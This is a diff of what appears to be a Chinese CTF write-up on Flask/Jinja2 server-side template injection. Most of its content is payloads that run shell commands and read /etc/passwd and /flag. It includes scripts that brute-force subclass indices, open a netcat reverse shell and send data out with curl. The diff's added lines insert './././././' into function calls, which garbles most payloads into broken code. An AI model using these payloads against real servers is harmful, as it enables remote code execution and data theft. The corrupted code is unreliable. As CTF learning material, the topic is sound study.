@@ -2,7 +2,7 @@
 title: SSTI模版注入
 date: 2024-08-24 13:59:56
 tags: CTF
-categories: CTF-WEB
+categories: CTF-Web
 ---
 
 #  1.Python venv
@@ -71,15 +71,15 @@ if__name__=='__main__':
 
 render_template：加载HTML文件。默认文件路径在templates目录下
 
-![image-20240423201130061](./SSTI/image-20240423201130061.png)
+![image-20240423201130061](./././././SSTI/image-20240423201130061.png)
 
 render_template_string:用于渲染字符串，直接定义内容
 
-![image-20240423201307047](./SSTI/image-20240423201307047.png)
+![image-20240423201307047](./././././SSTI/image-20240423201307047.png)
 
 # 3.Flask漏洞
 
-![image-20240423203613269](./SSTI/image-20240423203613269.png)
+![image-20240423203613269](./././././SSTI/image-20240423203613269.png)
 
 这幅图的含义是通过这些指令去判断对方用的是什么模板，下面解释一下这幅图的意思:
 绿色箭头是执行成功，红色箭头是执行失败。
@@ -127,7 +127,7 @@ eval()计算字符串表达式的值
 popen()：执行一个shell以运行命令来开启一个进程
 
 ```python
-"".__class__.__base__.__subclasses__()[117].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('ls').read()")
+"".__class__.__base__.__subclasses__()[117].__init__.__globals__['__builtins__']['eval'](./././././"__import__('os').popen('ls').read()")
 ```
 
 117是os._wrap_close
@@ -161,7 +161,7 @@ for i in range(500):
 找到_frozen_importlib_external.FileLoader类名的位置
 
 ```php
-{{"".__class__.__base__.__subclasses__()[79]["get_data"](0,"/etc/passwd")}}
+{{"".__class__.__base__.__subclasses__()[79]["get_data"](./././././0,"/etc/passwd")}}
 
 ```
 
@@ -185,7 +185,7 @@ for i in range(500):
 ```
 
 ```php
-{{"".__class__.__base__.__subclasses__()[473].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("cat /flag").read()')}}
+{{"".__class__.__base__.__subclasses__()[473].__init__.__globals__['__builtins__']['eval'](./././././'__import__("os").popen("cat /flag").read()')}}
 ```
 
 
@@ -219,7 +219,7 @@ for i in range(500):
 ```
 
 ```
-{{“”.__class__.__base__.__subclasses__()[117].__init__.__globals__[‘builtins’][‘eval’]("__import__.(‘os’).popen(‘ls’).read()")}} 
+{{“”.__class__.__base__.__subclasses__()[117].__init__.__globals__[‘builtins’][‘eval’](./././././"__import__.(‘os’).popen(‘ls’).read()")}} 
 ```
 
 查找os模块脚本
@@ -264,7 +264,7 @@ for i in range(500):
 ```
 
 ```php
-{{[].__class__.__base__.__subclasses__()[69]["load_module"]("os")["popen"]("cat /flag").read()}}
+{{[].__class__.__base__.__subclasses__()[69]["load_module"](./././././"os")["popen"](./././././"cat /flag").read()}}
 ```
 
 #### subprocess.Popen模块
@@ -287,7 +287,7 @@ for i in range(500):
 ```
 
 ```php
-{{[].__class__.__base__.__subclasses__()[200]('ls/',shell=True,stdout=-1).communicate()[0].strip()}}
+{{[].__class__.__base__.__subclasses__()[200](./././././'ls/',shell=True,stdout=-1).communicate()[0].strip()}}
 ```
 
 #### importlib类执行命令
@@ -295,7 +295,7 @@ for i in range(500):
 importlib类执行命令相当于自己导入，可以加载第三方库，使用load_module加载os
 
 ```
-{{[].__class__.__base__.__subclasses__()[69].["load_module"]("os")[“popen”](‘ls’).read()}}
+{{[].__class__.__base__.__subclasses__()[69].["load_module"](./././././"os")[“popen”](./././././‘ls’).read()}}
 ```
 
 #### linecache函数执行命令
@@ -333,7 +333,7 @@ linecache函数可用于读取任意一个文件的某一行，而这个函数�
 有回显说明<font color=red>**"".\_\_class\_\_**</font>有内容
 
 ```php
-{% if "".__class__.__base__.__subclasses__()[117].__init__.__globals__["popen"]("cat /etc/passwd").read() %}benben{% endif %}
+{% if "".__class__.__base__.__subclasses__()[117].__init__.__globals__["popen"](./././././"cat /etc/passwd").read() %}benben{% endif %}
 ```
 
 查询脚本
@@ -342,7 +342,7 @@ linecache函数可用于读取任意一个文件的某一行，而这个函数�
 import requests
 url=input('请输入URL:')
 for i in range(500):
-    data={"code":'{% if "".__class__.__base__.__subclasses__()['+str(i)+'].__init__.__globals__["popen"]("cat /etc/passwd").read() %}benben{% endif %}'}
+    data={"code":'{% if "".__class__.__base__.__subclasses__()['+str(i)+'].__init__.__globals__["popen"](./././././"cat /etc/passwd").read() %}benben{% endif %}'}
     try:
         response = requests.post(url,data=data)
         #print(response)
@@ -367,7 +367,7 @@ import requests
 url=input('请输入URL:')
 for i in range(500):
      try:
-    data={"name":"{{().__class__.__base__.__subclasses__()["+str(i)+"].__init__.__globals__['popen']('netcat 192.168.1.161 7777 -e /bin/bash').read()}}"}
+    data={"name":"{{().__class__.__base__.__subclasses__()["+str(i)+"].__init__.__globals__['popen'](./././././'netcat 192.168.1.161 7777 -e /bin/bash').read()}}"}
         response = requests.post(url,data=data)
     except:
         pass
@@ -384,7 +384,7 @@ import requests
 url=input('请输入URL:')
 for i in range(500):
     try:
-        data={"code":"{{().__class__.__base__.__subclasses__()["+str(i)+"].__init__.__globals__['popen']('curl http://192.168.204.149/`cat /flag`').read()}}"}
+        data={"code":"{{().__class__.__base__.__subclasses__()["+str(i)+"].__init__.__globals__['popen'](./././././'curl http://192.168.204.149/`cat /flag`').read()}}"}
         response = requests.post(url,data=data)
     except:
         pass
@@ -402,15 +402,15 @@ __getitem__()=[]
 
 ## 1.request.args.cmd配合get提交
 
-![image-20240513162251340](SSTI/image-20240513162251340.png)
+![image-20240513162251340](./././././SSTI/image-20240513162251340.png)
 
 ## 2.request.form.cmd配合from提交
 
-![image-20240513161046099](SSTI/image-20240513161046099.png)
+![image-20240513161046099](./././././SSTI/image-20240513161046099.png)
 
 ## 3.request.cookies.cmd配合cookie
 
-![image-20240513162359073](SSTI/image-20240513162359073.png)
+![image-20240513162359073](./././././SSTI/image-20240513162359073.png)
 
 ## 4.也可以使用values获取所有参数
 
@@ -444,10 +444,10 @@ attr()函数
 原paylload
 
 ```
-{{''.__class__.__base__.__subclasses__()[117].__init__.__globals__["popen"]('cat /flag').read()}}
+{{''.__class__.__base__.__subclasses__()[117].__init__.__globals__["popen"](./././././'cat /flag').read()}}
 ```
 
-![image-20240513212013589](SSTI/image-20240513212013589.png)
+![image-20240513212013589](./././././SSTI/image-20240513212013589.png)
 
 ```
 http://192.168.204.149:18080/flasklab/level/6?class=__class__&base=__base__&sub=__subclasses__&geti=__getitem__&init=__init__&globals=__globals__
@@ -528,11 +528,11 @@ url={%print(()|attr(%22\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f%22
 ## 中括号代替
 
 ```
-{{''.__class__.__base__.__subclasses__()[117].__init__.__globals__["popen"]('cat /flag').read()}}
+{{''.__class__.__base__.__subclasses__()[117].__init__.__globals__["popen"](./././././'cat /flag').read()}}
 ```
 
 ```
-{{()['__class__']['__base__']['__subclasses__']()[117]['__init__']['__globals__']['popen']('cat /etc/passwd')['read']()}}
+{{()['__class__']['__base__']['__subclasses__'](./././././)[117]['__init__']['__globals__']['popen'](./././././'cat /etc/passwd')['read'](./././././)}}
 ```
 
 
